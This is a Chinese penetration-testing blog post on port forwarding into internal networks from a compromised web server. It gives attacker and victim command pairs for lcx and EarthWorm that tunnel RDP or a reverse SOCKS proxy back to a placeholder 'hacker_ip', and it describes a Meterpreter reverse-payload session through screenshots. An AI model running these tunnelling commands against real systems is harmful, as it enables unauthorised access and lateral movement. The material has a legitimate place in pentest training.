+++
date = "2016-08-08T19:33:45+08:00"
description = ""
draft = false
tags = ["端口转发"]
title = "端口转发"
topics = ["Pentest"]

+++

### 0x00 应用场景
* 内网IP的80端口通过端口映射到了外网IP的80端口上
* 内网的Web服务器通过外网IP反向代理(如Nginx)
也就是说Web服务器在内网中

### 0x01 判断Web是否为内网
* 向ping域名，查看IP是外网
* 用webshell查看ip却是内网IP

### 0x02 端口转发工具
* lcx
* htran
* [EarthWorm](http://rootkiter.com/EarthWorm/)
* netsh
* reGeorg
* meterpreter porfwd

### 0x03 lcx端口转发
* Hacker：lcx.exe -listen 500 8888
* Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389
* Hacker：cmd mstsc hacker_ip:500
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_hacker_run_lcx.png" alt="hacker运行lcx.png" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_vimctim_run_lcx.png" alt="vimctim端运行lcx.png" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_hacker_remote_conn.png" alt="hacker远程连接.png" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_hacker_remote_conn_success.png" alt="hacker远程连接成功.png" %}}

### 0x04 EarchWorm端口转发
* Hacker：./ew -s rcsocks -l 1080 -e 8888
* Victim：./ew -s rssocks -d hacker_ip -e 8888
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_earchworm.png" alt="earchworm原理.png" %}}
#### 1. 启动EarchWorm
{{% fluid_img src="/img/post/privilge_escalation_win_linux_run_ew.png" alt="hacker服务器启动ew.png" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_victim_run_ew.png" alt="victim启动ew.png" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_linux_get_victim_conn.png" alt="victim连接hacker服务器.png" %}}
#### 2. hacker主机使用代理
{{% fluid_img src="/img/post/privilge_escalation_win_hacker_set_proxy1.png" alt="hacker内网主机设置代理1.png" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_hacker_set_proxy2.png" alt="hacker内网主机设置代理2.png" %}}
#### 3. hacker内网主机连接目标的内网主机
{{% fluid_img src="/img/post/privilge_escalation_win_ew_hacker_remote_conn.png" alt="hacker连接内网主机.png" %}}
<br /><br />
{{% fluid_img src="/img/post/privilge_escalation_win_ew_hacker_remote_conn_success.png" alt="hacker连接内网主机成功.png" %}}

### 0x05 Meterpreter
* Hacker端生成payload
{{% fluid_img src="/img/post/privilge_escalation_win_msf_creat_payload.png" alt="msf生成win反弹型的payload.png" %}}
* msf监听端口
{{% fluid_img src="/img/post/privilge_escalation_win_set_metasploit_listen_port.png" alt="设置metasploit监听端口.png" %}}
* 目标主机运行exp
{{% fluid_img src="/img/post/privilge_escalation_win_victim_run_exp.png" alt="目标主机运行exp.png" %}}
* msf收到新会话
{{% fluid_img src="/img/post/privilge_escalation_win_msf_get_conn.png" alt="msf收到目标主机的连接.png" %}}
* msf执行命令
{{% fluid_img src="/img/post/privilge_escalation_win_msf_exec_command.png" alt="msf远程执行命令.png" %}}